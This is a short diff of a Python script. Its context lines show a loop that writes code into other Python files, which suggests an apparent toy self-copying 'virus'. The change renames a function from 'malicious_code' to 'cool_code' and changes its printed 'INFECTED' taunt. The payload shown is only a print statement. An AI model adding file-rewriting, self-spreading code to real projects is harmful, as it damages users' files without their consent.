@@ -32,8 +32,8 @@ for file in python_files:
             f.writelines(final_code)
 
 
-def malicious_code():
-    print('YOU HAVE BEEN INFECTED HAHAHA !!!')
+def cool_code():
+    print('YOU HAVE BEEN made fun of HAHAHA !!!')
 
 
-malicious_code()
+cool_code()
